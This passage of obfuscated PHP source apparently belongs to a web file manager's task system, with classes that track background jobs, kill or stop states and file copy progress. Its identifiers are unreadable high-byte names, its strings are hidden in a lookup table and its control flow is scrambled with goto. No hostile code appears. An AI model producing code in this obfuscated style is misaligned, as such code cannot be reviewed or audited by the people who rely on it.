d‹„æ·ğ‚£: } private static function closeDatabase() { goto AÌÚİ²ÒïØ; CÊ¯ÈØ¢â‘: if (!$bÀé’Ê‚ÊŸ) { $bÀé’Ê‚ÊŸ = time(); } if (time() - $bÀé’Ê‚ÊŸ < $Bé¤Ûáèö) { return; } $bÀé’Ê‚ÊŸ = time(); goto EøßŒ°­Ù; EøßŒ°­Ù: $BªÜí‘ÕÀÌ = Model($A¤ö‘‰Ûõ[506])->db($A¤ö‘‰Ûõ[43]); if ($BªÜí‘ÕÀÌ) { $BªÜí‘ÕÀÌ->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($A¤ö‘‰Ûõ[1489], $A¤ö‘‰Ûõ[1490]); die; } goto d¡…ßœ•í„; AÌÚİ²ÒïØ: $A¤ö‘‰Ûõ =& $_SERVER[¾÷]; static $bÀé’Ê‚ÊŸ = 0; $Bé¤Ûáèö = 1800; goto CÊ¯ÈØ¢â‘; d¡…ßœ•í„: } public static function taskRun($bšÉÖ”™†) { goto Dß¯Å¤ ë•; c‡Œ‹Í îÍ: $eœ˜Ç¾¢ªÎ = timeFloat(); $d¦ŒÑ¨½Ëç = $a•øé‡Ó”[43]; switch ($bšÉÖ”™†[$a•øé‡Ó”[39]]) { case $a•øé‡Ó”[312]: $f†‚¥—£‘« = url_request($bšÉÖ”™†[$a•øé‡Ó”[1494]], $a•øé‡Ó”[236], !1, !1, !1, !1, 5); $d¦ŒÑ¨½Ëç = strlen($f†‚¥—£‘«); break; case $a•øé‡Ó”[235]: $d¦ŒÑ¨½Ëç = Hook::apply($bšÉÖ”™†[$a•øé‡Ó”[1494]]); default: break; } goto Då†«—¬¥õ; Då†«—¬¥õ: Model($a•øé‡Ó”[1495])->add(array($a•øé‡Ó”[1496] => $a•øé‡Ó”[43], $a•øé‡Ó”[1497] => $a•øé‡Ó”[500], $a•øé‡Ó”[39] => $a•øé‡Ó”[1498] . $bšÉÖ”™†[$a•øé‡Ó”[397]], $a•øé‡Ó”[1499] => json_encode(array($a•øé‡Ó”[38] => $bšÉÖ”™†[$a•øé‡Ó”[38]], $a•øé‡Ó”[1500] => timeFloat() - $eœ˜Ç¾¢ªÎ, $a•øé‡Ó”[298] => $d¦ŒÑ¨½Ëç)))); self::log($a•øé‡Ó”[1501] . $bšÉÖ”™†[$a•øé‡Ó”[397]] . $a•øé‡Ó”[1502] . $d¦ŒÑ¨½Ëç); return !0; goto FÌ¡³´¼‡Á; Dß¯Å¤ ë•: $a•øé‡Ó” =& $_SERVER[¾÷]; self::log($a•øé‡Ó”[1491] . $bšÉÖ”™†[$a•øé‡Ó”[397]] . $a•øé‡Ó”[1492] . $bšÉÖ”™†[$a•øé‡Ó”[38]] . $a•øé‡Ó”[1493] . $bšÉÖ”™†[$a•øé‡Ó”[1494]]); Model($a•øé‡Ó”[1475])->run($bšÉÖ”™†[$a•øé‡Ó”[397]]); goto c‡Œ‹Í îÍ; FÌ¡³´¼‡Á: } private static function valueGet($B¬ïÓ¼¶í) { $DÖ£Üàèª¦ =& $_SERVER[¾÷]; $e¥ğ”çŠò = $DÖ£Üàèª¦[1503]; $E±±ÎˆÀ´­ = Model($DÖ£Üàèª¦[1504])->get($B¬ïÓ¼¶í, $e¥ğ”çŠò); if (is_null($E±±ÎˆÀ´­)) { Model($DÖ£Üàèª¦[1504])->set($DÖ£Üàèª¦[1473], 10, $e¥ğ”çŠò); Model($DÖ£Üàèª¦[1504])->set($DÖ£Üàèª¦[711], $DÖ£Üàèª¦[96], $e¥ğ”çŠò); Model($DÖ£Üàèª¦[1504])->set($DÖ£Üàèª¦[1468], $DÖ£Üàèª¦[500], $e¥ğ”çŠò); $E±±ÎˆÀ´­ = Model($DÖ£Üàèª¦[1504])->get($B¬ïÓ¼¶í, $e¥ğ”çŠò); } return $E±±ÎˆÀ´­; } private static function valueSet($f¢­Ş‘Áà, $Câ×Ìˆ†˜–) { $E‚•‡Áï =& $_SERVER[¾÷]; return Model($E‚•‡Áï[1504])->set($f¢­Ş‘Áà, $Câ×Ìˆ†˜–, $E‚•‡Áï[1503]); } protected static function log($Aª®µÒàòØ) { write_log($Aª®µÒàòØ, $_SERVER[¾÷][1490]); } private static function cacheClear() { $E‘ÀÎˆö¨ =& $_SERVER[¾÷]; $c·‰ô…ù„… = Model($E‘ÀÎˆö¨[1504])->cacheKey($E‘ÀÎˆö¨[1503]); Cache::clearMemory($c·‰ô…ù„…); Model($E‘ÀÎˆö¨[1475])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\162\165\156\x6e\151\x6e\147"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($aÀ‘‘Á¼‹¦, $f–³á—‘¢Å = '', $aÕë×àÕìé = 0, $bŠ‹šŠİÆ¦ = '') { goto B‚ÙªÛÉÕñ; B‚ÙªÛÉÕñ: $DÏÄ®„Ó¦¸ =& $_SERVER[¾÷]; if (self::get($aÀ‘‘Á¼‹¦)) { return; } $this->task = array($DÏÄ®„Ó¦¸[397] => $aÀ‘‘Á¼‹¦, $DÏÄ®„Ó¦¸[1505] => USER_ID, $DÏÄ®„Ó¦¸[1410] => $bŠ‹šŠİÆ¦, $DÏÄ®„Ó¦¸[39] => $f–³á—‘¢Å, $DÏÄ®„Ó¦¸[1000] => $DÏÄ®„Ó¦¸[43], $DÏÄ®„Ó¦¸[998] => $aÕë×àÕìé, $DÏÄ®„Ó¦¸[1012] => 0, $DÏÄ®„Ó¦¸[1506] => 0, $DÏÄ®„Ó¦¸[1507] => 0, $DÏÄ®„Ó¦¸[742] => timeFloat(), $DÏÄ®„Ó¦¸[741] => 0, $DÏÄ®„Ó¦¸[1508] => 0, $DÏÄ®„Ó¦¸[1509] => 0, $DÏÄ®„Ó¦¸[1510] => 0, $DÏÄ®„Ó¦¸[711] => $DÏÄ®„Ó¦¸[1468]); goto E½ÕŒàĞë‰; E½ÕŒàĞë‰: $GLOBALS[$DÏÄ®„Ó¦¸[1511]] = 1; Hook::bind($DÏÄ®„Ó¦¸[1470], array($this, $DÏÄ®„Ó¦¸[1512])); Hook::bind($DÏÄ®„Ó¦¸[1513], array($this, $DÏÄ®„Ó¦¸[1514])); goto d™ÜØêéÇ; d™ÜØêéÇ: $this->startAfter(); Hook::trigger($DÏÄ®„Ó¦¸[1515], $this->task); $this->task[$DÏÄ®„Ó¦¸[1508]] = timeFloat(); goto cãË›šùØƒ; cãË›šùØƒ: } public function end() { goto BË–Åà•ÖŠ; cøµÌ³Üšİ: $FØĞ÷Áß…ñ = timeFloat() - $this->task[$Dœ†ÏÛáæ¥[742]]; self::log($Dœ†ÏÛáæ¥[1516] . $this->task[$Dœ†ÏÛáæ¥[397]] . $Dœ†ÏÛáæ¥[1517] . $FØĞ÷Áß…ñ . $Dœ†ÏÛáæ¥[1518]); Hook::unbind($Dœ†ÏÛáæ¥[1470], array($this, $Dœ†ÏÛáæ¥[1512])); goto fš˜¥îõ; BË–Åà•ÖŠ: $Dœ†ÏÛáæ¥ =& $_SERVER[¾÷]; if (!$this->task) { return; } if ($this->task[$Dœ†ÏÛáæ¥[1508]]) { self::valueSet($this->task[$Dœ†ÏÛáæ¥[397]], !1); } goto cøµÌ³Üšİ; fš˜¥îõ: Hook::unbind($Dœ†ÏÛáæ¥[1513], array($this, $Dœ†ÏÛáæ¥[1514])); $this->endAfter(); $this->task = !1; goto Cñ…ÄïÙÒÛ; Cñ…ÄïÙÒÛ: } public function update($CÑ“‘í…Àè = 0, $bÚ˜àê· = false) { goto DÚÀ¢é£Ä; DÚÀ¢é£Ä: $CÛÂÈ¥Ûğ› =& $_SERVER[¾÷]; $Aõøš¸ËğÏ =& $this->task; if (!$Aõøš¸ËğÏ) { return; } goto F ®Å«¼²; A½àó§¿®: Hook::trigger($CÛÂÈ¥Ûğ›[1522], $Aõøš¸ËğÏ); self::valueSet($Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[397]], $Aõøš¸ËğÏ); goto B¯Öˆ‘ƒí; cø¼ÍïßìÜ: $a‡¯ÎˆàùÖ = self::get($Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[397]]); $bÂ›öö = $a‡¯ÎˆàùÖ[$CÛÂÈ¥Ûğ›[711]]; if ($bÂ›öö == self::STATYS_KILL) { $EÛ¾ğáÔÎÒ = array($CÛÂÈ¥Ûğ›[1519] => LNG($CÛÂÈ¥Ûğ›[1520]), $CÛÂÈ¥Ûğ›[1062] => !1); Cache::set($CÛÂÈ¥Ûğ›[1521] . $this->task[$CÛÂÈ¥Ûğ›[397]], $EÛ¾ğáÔÎÒ, 30); $this->end(); die; } else { if ($bÂ›öö == self::STATYS_STOP) { $b½¦ô ÷µ = 2; $a‡¯ÎˆàùÖ[$CÛÂÈ¥Ûğ›[1509]] += $b½¦ô ÷µ; self::valueSet($Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[397]], $a‡¯ÎˆàùÖ); sleep($b½¦ô ÷µ); $this->update(); return; } } goto c çĞà¡Şœ; F ®Å«¼²: $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1012]] += $CÑ“‘í…Àè; $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[741]] = timeFloat(); if ($Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[998]]) { if ($Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[998]] < $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1012]]) { $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[998]] = $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1012]]; } $E¬µ¿¢¼Ê™ = timeFloat() - $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[742]] - $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1509]]; $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1506]] = $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1012]] / $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[998]]; $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1507]] = $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1012]] / $E¬µ¿¢¼Ê™; if ($Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1506]] > 0) { $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1510]] = $E¬µ¿¢¼Ê™ * (1 - $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1506]]) / $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1506]]; } $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1510]] = $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1510]] <= 0 ? 0 : $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1510]]; } goto AÔµÜ‡ÕÆÉ; AÔµÜ‡ÕÆÉ: $this->updateAfter(); $b’º·Ö°£ = 0.2; if (timeFloat() - $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1508]] < $b’º·Ö°£ && !$bÚ˜àê·) { return; } goto cø¼ÍïßìÜ; c çĞà¡Şœ: $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[711]] = $bÂ›öö ? $bÂ›öö : $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[711]]; $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1509]] = $a‡¯ÎˆàùÖ[$CÛÂÈ¥Ûğ›[1509]] ? $a‡¯ÎˆàùÖ[$CÛÂÈ¥Ûğ›[1509]] : 0; $Aõøš¸ËğÏ[$CÛÂÈ¥Ûğ›[1508]] = timeFloat(); goto A½àó§¿®; B¯Öˆ‘ƒí: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($f‡îÅ‡‡ˆ½) { $CÈøß‹ Ø =& $_SERVER[¾÷]; Cache::set($CÈøß‹ Ø[1521] . $this->task[$CÈøß‹ Ø[397]], $f‡îÅ‡‡ˆ½, 60); return $f‡îÅ‡‡ˆ½; } public static function get($a®¿½¬®ªù) { return self::valueGet($a®¿½¬®ªù); } public static function listData() { $cÈ§²ŒÄ = self::valueGet(); return array_sort_by($cÈ§²ŒÄ, $_SERVER[¾÷][742], !0); } public static function kill($e–…ˆ’ˆ¼Ø) { return self::changeStatus($e–…ˆ’ˆ¼Ø, self::STATYS_KILL); } public static function stop($CÎ½ËÊ¹˜Ğ) { return self::changeStatus($CÎ½ËÊ¹˜Ğ, self::STATYS_STOP); } public static function restart($b¸ö«ğœÃ…) { return self::changeStatus($b¸ö«ğœÃ…, self::STATYS_RUNNING); } public static function killAll() { $eøÑ¿„’ñ· =& $_SERVER[¾÷]; $a‹‘Êâ‡÷¡ = self::listData(); foreach ($a‹‘Êâ‡÷¡ as $f¼­äÍÛêË) { self::kill($f¼­äÍÛêË[$eøÑ¿„’ñ·[397]]); } sleep(2); foreach ($a‹‘Êâ‡÷¡ as $f¼­äÍÛêË) { self::valueSet($f¼­äÍÛêË[$eøÑ¿„’ñ·[397]], !1); } } private static function changeStatus($eÇ³¹”¹¯à, $aÕ¥¤´ª»³) { goto fÖĞ‘°î; fË‰¬³‡ğ: $Eàœ‡«Ñô°[$e¹ƒÂêõÙ‹[711]] = $aÕ¥¤´ª»³; self::valueSet($eÇ³¹”¹¯à, $Eàœ‡«Ñô°); self::log($e¹ƒÂêõÙ‹[1523] . $Eàœ‡«Ñô°[$e¹ƒÂêõÙ‹[397]] . $e¹ƒÂêõÙ‹[1524] . $aÕ¥¤´ª»³); goto Eİô¦‰Æ±; Eİô¦‰Æ±: return !0; goto bÀ’ğÔÜì…; fÖĞ‘°î: $e¹ƒÂêõÙ‹ =& $_SERVER[¾÷]; $Eàœ‡«Ñô° = self::valueGet($eÇ³¹”¹¯à); if (!$Eàœ‡«Ñô°) { return !1; } goto fË‰¬³‡ğ; bÀ’ğÔÜì…: } public static function valueGet($A¨ŠäÇ¸Ğ = false) { $EãÅ³¦øÆì =& $_SERVER[¾÷]; if ($A¨ŠäÇ¸Ğ) { $A†´¡Îñ”É = Model($EãÅ³¦øÆì[428])->where(array($EãÅ³¦øÆì[102] => $A¨ŠäÇ¸Ğ, $EãÅ³¦øÆì[39] => $EãÅ³¦øÆì[1525]))->find(); return $A†´¡Îñ”É ? json_decode($A†´¡Îñ”É[$EãÅ³¦øÆì[379]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($BŠë«–Ç = false) { goto C†£šˆêÔ«; FñŸÉ™ì†Ë: $Fïè©ÂøğÒ = Model($B¸´éœÌ¶[428])->where($c–®Çâ¬–Ë)->select(); $Fïè©ÂøğÒ = $Fïè©ÂøğÒ ? $Fïè©ÂøğÒ : array(); foreach ($Fïè©ÂøğÒ as $c¿êÒâ£ÊÏ => $c­É’…Ó¥) { $Fïè©ÂøğÒ[$c¿êÒâ£ÊÏ] = json_decode($c­É’…Ó¥[$B¸´éœÌ¶[379]], !0); } goto D×ÇŠ¹¢œ«; C†£šˆêÔ«: $B¸´éœÌ¶ =& $_SERVER[¾÷]; $c–®Çâ¬–Ë = array($B¸´éœÌ¶[39] => $B¸´éœÌ¶[1525]); if ($BŠë«–Ç) { $c–®Çâ¬–Ë[$B¸´éœÌ¶[1505]] = $BŠë«–Ç; } goto FñŸÉ™ì†Ë; D×ÇŠ¹¢œ«: return $Fïè©ÂøğÒ; goto eÁœã‰‘ ; eÁœã‰‘ : } public static function valueSet($BÏÃÇ¨‹Œ, $aŒÌÔ´ö˜) { goto b”£©Ê¢ËÉ; b”£©Ê¢ËÉ: $dÒŸŒ•¤¸ö =& $_SERVER[¾÷]; if (!$aŒÌÔ´ö˜) { return Model($dÒŸŒ•¤¸ö[428])->where(array($dÒŸŒ•¤¸ö[102] => $BÏÃÇ¨‹Œ, $dÒŸŒ•¤¸ö[39] => $dÒŸŒ•¤¸ö[1525]))->delete(); } $A ×¤ïŠ˜‰ = json_encode($aŒÌÔ´ö˜); goto C°´ ÕªŠ£; eåÛ£Ê²: Model($dÒŸŒ•¤¸ö[428])->add($eÉõåˆÜ, array(), !0); goto cğµ÷¾ÙË…; C°´ ÕªŠ£: if (!$A ×¤ïŠ˜‰) { ob_start(); var_dump($aŒÌÔ´ö˜); $E¦Ò­•Ç‚­ = ob_get_clean(); self::log($dÒŸŒ•¤¸ö[1526] . json_encode_force($E¦Ò­•Ç‚­)); } if (!$BÏÃÇ¨‹Œ || !$aŒÌÔ´ö˜[$dÒŸŒ•¤¸ö[397]]) { return !1; } $eÉõåˆÜ = array($dÒŸŒ•¤¸ö[39] => $dÒŸŒ•¤¸ö[1525], $dÒŸŒ•¤¸ö[1505] => USER_ID, $dÒŸŒ•¤¸ö[102] => $BÏÃÇ¨‹Œ, $dÒŸŒ•¤¸ö[379] => $A ×¤ïŠ˜‰); goto eåÛ£Ê²; cğµ÷¾ÙË…: } public static function log($eªß×Òß®×) { if (!GLOBAL_DEBUG) { return; } write_log($eªß×Òß®×, $_SERVER[¾÷][1527]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto cƒçÀ†Ó¤”; eÖî¸Ù”Œ„: Hook::bind($C¦‡í´ô»³[574], array($this, $C¦‡í´ô»³[1535])); Hook::bind($C¦‡í´ô»³[541], array($this, $C¦‡í´ô»³[1536])); Hook::bind($C¦‡í´ô»³[538], array($this, $C¦‡í´ô»³[1536])); goto FŞ…¯›ÍŠÔ; AÔ¶ÙÕñÕè: $D»«ÕóÙô[$C¦‡í´ô»³[1546]] = LNG($C¦‡í´ô»³[1547]); $D»«ÕóÙô[$C¦‡í´ô»³[1548]] = 0; $D»«ÕóÙô[$C¦‡í´ô»³[1549]] = 0; goto D‡Š‰Ç; f¡ùÕ¹èÕ: $D»«ÕóÙô[$C¦‡í´ô»³[1552]] = 0; $D»«ÕóÙô[$C¦‡í´ô»³[1553]] = 0; if (!$D»«ÕóÙô[$C¦‡í´ô»³[1410]]) { $D»«ÕóÙô[$C¦‡í´ô»³[1410]] = LNG($C¦‡í´ô»³[1554]); } goto Fğ„®µ„°ƒ; eÒÓ†ØôÑã: Hook::bind($C¦‡í´ô»³[570], array($this, $C¦‡í´ô»³[1533])); Hook::bind($C¦‡í´ô»³[571], array($this, $C¦‡í´ô»³[1534])); Hook::bind($C¦‡í´ô»³[573], array($this, $C¦‡í´ô»³[1535])); goto eÖî¸Ù”Œ„; cƒçÀ†Ó¤”: $C¦‡í´ô»³ =& $_SERVER[¾÷]; $D»«ÕóÙô =& $this->task; $this->sourceCopyFolder = !1; goto C“éÇ³øŸ; bÁ¶µ‹ãŠØ: Hook::bind($C¦‡í´ô»³[1537], array($this, $C¦‡í´ô»³[1538])); Hook::bind($C¦‡í´ô»³[563], array($this, $C¦‡í´ô»³[1539])); $this->sourceModelCopyFlag = !1; goto a³§»†«Ÿº; C“éÇ³øŸ: Hook::bind($C¦‡í´ô»³[1528], array($this, $C¦‡í´ô»³[1529])); Hook::bind($C¦‡í´ô»³[1085], array($this, $C¦‡í´ô»³[1530])); Hook::bind($C¦‡í´ô»³[1531], array($this, $C¦‡í´ô»³[1532])); goto eÒÓ†ØôÑã; a³§»†«Ÿº: Hook::bind($C¦‡í´ô»³[1540], array($this, $C¦‡í´ô»³[1541])); Hook::bind($C¦‡í´ô»³[1542], array($this, $C¦‡í´ô»³[1543])); Hook::bind($C¦‡í´ô»³[1544], array($this, $C¦‡í´ô»³[1545])); goto AÔ¶ÙÕñÕè; D‡Š‰Ç: $D»«ÕóÙô[$C¦‡í´ô»³[1000]] = $C¦‡í´ô»³[43]; $D»«ÕóÙô[$C¦‡í´ô»³[1550]] = $C¦‡í´ô»³[43]; $D»«ÕóÙô[$C¦‡í´ô»³[1551]] = 0; goto f¡ùÕ¹èÕ; FŞ…¯›ÍŠÔ: Hook::bind($C¦‡í´ô»³[543], array($this, $C¦‡í´ô»³[1536])); Hook::bind($C¦‡í´ô»³[545], array($this, $C¦‡í´ô»³[1536])); Hook::bind($C¦‡í´ô»³[547], array($this, $C¦‡í´ô»³[1536])); goto bÁ¶µ‹ãŠØ; Fğ„®µ„°ƒ: } protected function endAfter() { goto AÖÃ­ù÷‚; AÖÃ­ù÷‚: $A¹ññ¼¸Õ =& $_SERVER[¾÷]; Hook::unbind($A¹ññ¼¸Õ[1528], array($this, $A¹ññ¼¸Õ[1529])); Hook::unbind($A¹ññ¼¸Õ[1085], array($this, $A¹ññ¼¸Õ[1530])); goto Aâ¥¬Şºçí; Aâ¥¬Şºçí: Hook::unbind($A¹ññ¼¸Õ[1531], array($this, $A¹ññ¼¸Õ[1532])); Hook::unbind($A¹ññ¼¸Õ[570], array($this, $A¹ññ¼¸Õ[1533])); Hook::unbind($A¹ññ¼¸Õ[571], array($this, $A¹ññ¼¸Õ[1534])); goto dÍó¼¶Ñ‘ñ; dÍó¼¶Ñ‘ñ: Hook::unbind($A¹ññ¼¸Õ[573], array($this, $A¹ññ¼¸Õ[1535])); Hook::unbind($A¹ññ¼¸Õ[574], array($this, $A¹ññ¼¸Õ[1535])); Hook::unbind($A¹ññ¼¸Õ[541], array($this, $A¹ññ¼¸Õ[1536])); goto a¥“Ï¿§’·; cÎˆ÷ƒÏÀÂ: Hook::unbind($A¹ññ¼¸Õ[547], array($this, $A¹ññ¼¸Õ[1536])); Hook::unbind($A¹ññ¼¸Õ[1537], array($this, $A¹ññ¼¸Õ[1538])); Hook::unbind($A¹ññ¼¸Õ[563], array($this, $A¹ññ¼¸Õ[1539])); goto fì¶¨½Œ; a¥“Ï¿§’·: Hook::unbind($A¹ññ¼¸Õ[538], array($this, $A¹ññ¼¸Õ[1536])); Hook::unbind($A¹ññ¼¸Õ[543], array($this, $A¹ññ¼¸Õ[1536])); Hook::unbind($A¹ññ¼¸Õ[545], array($this, $A¹ññ¼¸Õ[1536])); goto cÎˆ÷ƒÏÀÂ; fì¶¨½Œ: Hook::unbind($A¹ññ¼¸Õ[1540], array($this, $A¹ññ¼¸Õ[1541])); Hook::unbind($A¹ññ¼¸Õ[1542], array($this, $A¹ññ¼¸Õ[1543])); Hook::unbind($A¹ññ¼¸Õ[1544], array($this, $A¹ññ¼¸Õ[1545])); goto DƒİãºŸè; DƒİãºŸè: } public function copyMoveStart($c«ÈÀÊ²ùï, $eÙ“İÄğ¦Í, $FÉÚ„ç¿İÃ, $FŞÓ‘ƒî¾) { goto BÆæ®ğÙ’î; Cğ‡ÑÃˆ: if (substr($eÙ“İÄğ¦Í, 0, strlen($B„ƒ…‹íŒÙ)) == $B„ƒ…‹íŒÙ) { return; } if (substr($FŞÓ‘ƒî¾, 0, strlen($B„ƒ…‹íŒÙ)) == $B„ƒ…‹íŒÙ) { return; } $C†à˜íÆ… =& $this->task; goto dÅ„ë‘™ò¸; dÅ„ë‘™ò¸: $C†à˜íÆ…[$b„õ×¬¢ƒÏ[1556]] = KodIO::transferType($c«ÈÀÊ²ùï, $FÉÚ„ç¿İÃ); $this->update(); goto CÃÒ‘ó¹Š„; BÆæ®ğÙ’î: $b„õ×¬¢ƒÏ =& $_SERVER[¾÷]; self::log($b„õ×¬¢ƒÏ[1555] . $eÙ“İÄğ¦Í . $b„õ×¬¢ƒÏ[76] . $FŞÓ‘ƒî¾); $B„ƒ…‹íŒÙ = rtrim(TEMP_FILES, $b„õ×¬¢ƒÏ[18]); goto Cğ‡ÑÃˆ; CÃÒ‘ó¹Š„: } public function updateAfter() { goto BŞˆ†’çäÜ; fµ›ç×õ: if ($this->sourceModelCopyFlag) { return; } if ($aÛîò‘‡¤[$Dºš·ßœ¿§[1556]] == $Dºš·ßœ¿§[1157]) { return; } if ($aÛîò‘‡¤[$Dºš·ßœ¿§[1556]] == $Dºš·ßœ¿§[1070] || $aÛîò‘‡¤[$Dºš·ßœ¿§[1556]] == $Dºš·ßœ¿§[116]) { if ($aÛîò‘‡¤[$Dºš·ßœ¿§[1550]]) { $aÛîò‘‡¤[$Dºš·ßœ¿§[1553]] = $aÛîò‘‡¤[$Dºš·ßœ¿§[1552]] + $aÛîò‘‡¤[$Dºš·ßœ¿§[1549]]; } } else { if ($aÛîò‘‡¤[$Dºš·ßœ¿§[1556]] == $Dºš·ßœ¿§[1158]) { if ($aÛîò‘‡¤[$Dºš·ßœ¿§[1550]] == $Dºš·ßœ¿§[1070]) { $aÛîò‘‡¤[$Dºš·ßœ¿§[1553]] = $aÛîò‘‡¤[$Dºš·ßœ¿§[1552]] + $aÛîò‘‡¤[$Dºš·ßœ¿§[1549]] * 0.5; } else { if ($aÛîò‘‡¤[$Dºš·ßœ¿§[1550]] == $Dºš·ßœ¿§[116]) { $aÛîò‘‡¤[$Dºš·ßœ¿§[1553]] = $aÛîò‘‡¤[$Dºš·ßœ¿§[1552]] + $aÛîò‘‡¤[$Dºš·ßœ¿§[1548]] * 0.5 + $aÛîò‘‡¤[$Dºš·ßœ¿§[1549]] * 0.5; } } } } goto d„š¾Î‡™…; d„š¾Î‡™…: $aÛîò‘‡¤[$Dºš·ßœ¿§[1506]] = $aÛîò‘‡¤[$Dºš·ßœ¿§[1553]] / $aÛîò‘‡¤[$Dºš·ßœ¿§[720]]; if ($aÛîò‘‡¤[$Dºš·ßœ¿§[1506]] > 0) { $cÊ£òˆµ± = timeFloat() - $aÛîò‘‡¤[$Dºš·ßœ¿§[742]] - $aÛîò‘‡¤[$Dºš·ßœ¿§[1509]]; $aÛîò‘‡¤[$Dºš·ßœ¿§[1510]] = $cÊ£òˆµ± * (1 - $aÛîò‘‡¤[$Dºš·ßœ¿§[1506]]) / $aÛîò‘‡¤[$Dºš·ßœ¿§[1506]]; } goto A†ÂÖƒªåù; BŞˆ†’çäÜ: $Dºš·ßœ¿§ =& $_SERVER[¾÷]; $aÛîò‘‡¤ =& $this->task; if (!$aÛîò‘‡¤[$Dºš·ßœ¿§[720]]) { return; } goto fµ›ç×õ; A†ÂÖƒªåù: } public function addPath($D•ĞÙàå) { goto BÑÃó¶ñ¤; BÑÃó¶ñ¤: $B§¸Á…Û‚¨ =& $_SERVER[¾÷]; if (!$D•ĞÙàå) { return; } $c‚ÕŒ‰¦Ä =& $this->task; goto FÉğ™îÜßˆ; FÉğ™îÜßˆ: $B—æ¢å ‡Ã = IO::infoWithChildren($D•ĞÙàå); $EäŞ“Ê³ïƒ = $c‚ÕŒ‰¦Ä[$B§¸Á…Û‚¨[1557]] ? $c‚ÕŒ‰¦Ä[$B§¸Á…Û‚¨[1557]][$B§¸Á…Û‚¨[1558]] : 0; $c‚ÕŒ‰¦Ä[$B§¸Á…Û‚¨[1557]] = array($B§¸Á…Û‚¨[1558] => $EäŞ“Ê³ïƒ + 1, $B§¸Á…Û‚¨[416] => $B—æ¢å ‡Ã[$B§¸Á…Û‚¨[38]], $B§¸Á…Û‚¨[85] => $B—æ¢å ‡Ã[$B§¸Á…Û‚¨[85]], $B§¸Á…Û‚¨[498] => $B—æ¢å ‡Ã[$B§¸Á…Û‚¨[498]] ? $B—æ¢å ‡Ã[$B§¸Á…Û‚¨[498]] : $B—æ¢å ‡Ã[$B§¸Á…Û‚¨[85]]); goto f¢ÆÚÓÎäø; f¢ÆÚÓÎäø: if ($B—æ¢å ‡Ã[$B§¸Á…Û‚¨[39]] == $B§¸Á…Û‚¨[201]) { $c‚ÕŒ‰¦Ä[$B§¸Á…Û‚¨[998]] += 1; } else { $c‚ÕŒ‰¦Ä[$B§¸Á…Û‚¨[998]] += $B—æ¢å ‡Ã[$B§¸Á…Û‚¨[90]][$B§¸Á…Û‚¨[88]]; if ($B—æ¢å ‡Ã[$B§¸Á…Û‚¨[399]]) { $c‚ÕŒ‰¦Ä[$B§¸Á…Û‚¨[998]] += $B—æ¢å ‡Ã[$B§¸Á…Û‚¨[90]][$B§¸Á…Û‚¨[89]] + 1; } } $c‚ÕŒ‰¦Ä[$B§¸Á…Û‚¨[720]] += $B—æ¢å ‡Ã[$B§¸Á…Û‚¨[87]]; $this->update(); goto A¤½°½êÒâ; A¤½°½êÒâ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Aôïƒ·Á®ã) { $b­Â¯¾Â˜ =& $_SERVER[¾÷]; $b™äÍª¼ =& $this->task; $b™äÍª¼[$b­Â¯¾Â˜[1546]] = $Aôïƒ·Á®ã[$b­Â¯¾Â˜[38]]; $b™äÍª¼[$b­Â¯¾Â˜[1000]] = $Aôïƒ·Á®ã[$b­Â¯¾Â˜[38]]; $this->update(); } public function copyFileStart($aÅ„£­§¿¹, $f™ÑØ‰‰Ÿ, $dš…Ş˜Š™£, $cëÉƒƒÆ, $FÂõ²¢³»È, $d«½†ù´Œ) { goto EÁ’¯Ëƒ³³; bÍ³²æçÜ»: $this->update(); goto F‡¡ª¿…İ; EÁ’¯Ëƒ³³: $Aù‹’ÔºÜƒ =& $_SERVER[¾÷]; $b£¦ Ûò—ã = $FÂõ²¢³»È; if ($b£¦ Ûò—ã == $GLOBALS[$Aù‹’ÔºÜƒ[1559]]) { $b£¦ Ûò—ã = $GLOBALS[$Aù‹’ÔºÜƒ[1560]]; } goto F×‡­é˜¨; e¿°ŞŒ´À: $CêªÛ±ƒ·[$Aù‹’ÔºÜƒ[1000]] = $Aù‹’ÔºÜƒ[43]; $CêªÛ±ƒ·[$Aù‹’ÔºÜƒ[1550]] = $Aù‹’ÔºÜƒ[43]; $CêªÛ±ƒ·[$Aù‹’ÔºÜƒ[1551]] = 0; goto bÍ³²æçÜ»; F×‡­é˜¨: $GLOBALS[$Aù‹’ÔºÜƒ[1560]] = $FÂõ²¢³»È; 